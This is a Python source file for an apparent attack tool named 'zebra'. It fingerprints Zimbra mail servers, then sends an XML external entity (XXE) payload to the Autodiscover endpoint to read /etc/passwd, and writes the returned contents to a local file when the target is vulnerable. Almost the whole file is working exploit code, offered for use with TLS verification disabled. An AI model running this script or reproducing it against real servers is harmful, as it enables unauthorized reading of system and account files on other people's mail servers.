from rich import print

import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def connection_checker(args):
    try:
        url = f'{args.u}:{args.p}'
        response = requests.get(url, verify=False, timeout=10)
        status_code = response.status_code
        body = response.text

        if(status_code == 200):
            print(f'[cyan]zebra > Connected succesfully with {url} | {status_code}')
            detect_zimbra_1(args, body, url)
        else:
            return print(f'[red]zebra > Connection problems with {url} | {status_code}\n')

    except requests.exceptions.ConnectionError as e:
        return print(f'[red]zebra > Connection error with {url} | {e}\n')

    except requests.exceptions.MissingSchema:
        return print(f'[red]zebra > Invalid URL, please use http:// or https:// in {url}\n')


def detect_zimbra_1(args, body, url):
    if 'Zimbra' in body:
        print(f'[cyan]zebra > Zimbra detected on {url}')
        detect_zimbra_2(url)
    else:
        print(f'[yellow]zebra > Zimbra not detect on first check, trying something more aggressive.')
        detect_zimbra_2(url)


def detect_zimbra_2(url):
    try:
        zimbra_url = f'{url}/Autodiscover/Autodiscover.xml'
        response = requests.get(zimbra_url, verify=False, timeout=10, allow_redirects=False)
        status_code = response.status_code

        if(status_code == 200):
            print(f'[cyan]zebra > Zimbra Autodiscover detected on {zimbra_url}')
            exploit(zimbra_url, url)
        else:
            return print(f'[red]zebra > Zimbra not detected in {zimbra_url} stopping...\n')

    except requests.exceptions.ConnectionError as e:
        return print(f'[red]zebra > Connection error with {url} | {e}\n')


def exploit(zimbra_url, url):
    print("[yellow]zebra > Executing exploit...")

    try:
        payload = """
<!DOCTYPE xxe [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
<Request>
<EMailAddress>aaaaa</EMailAddress>
<AcceptableResponseSchema>&xxe;</AcceptableResponseSchema>
</Request>
</Autodiscover>
        """

        headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0',
            'Content-Type': 'application-xml'
        }

        response = requests.post(zimbra_url, verify=False, timeout=10, allow_redirects=False, data=payload, headers=headers)
        body = response.text

        if('/bin/bash' in body):
            print("[cyan]zebra > Target is vulnerable a XXE Injection ;) [/]")
            save_content(url, body)
        else:
            return print("[red]zebra > Target is not vulnerable a XXE Injection, sad :( [/]\n")

    except requests.exceptions.ConnectionError as e:
        return print(f'[red]zebra > Connection error with {zimbra_url} | {e}\n')


def save_content(url, body):
    print("[cyan]zebra > Saving /etc/passwd content [/]\n")

    file_name = url.replace("://", "-")

    with open(f'{file_name}.txt', 'w') as file:
        file.write(body)
